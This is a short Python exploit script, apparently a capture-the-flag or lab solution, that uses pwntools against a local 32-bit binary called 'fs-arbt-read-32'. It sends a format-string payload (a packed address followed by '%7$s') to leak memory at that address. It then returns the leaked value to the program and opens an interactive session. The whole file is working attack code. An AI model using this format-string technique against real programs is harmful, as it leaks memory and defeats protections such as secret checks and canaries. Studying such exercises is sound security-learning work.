from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Launch processs
p = process('./fs-arbt-read-32', env=env)

inp = '\x50\xa0\x04\x08%7$s'

# Read 8 bytes
print(p.recvline())
p.sendline(inp)

data = p.recvline()
print(data.split())
data = u32(data.split()[1][4:])
print(data)
print(p.recvline())
p.sendline(hex(data))
p.interactive()
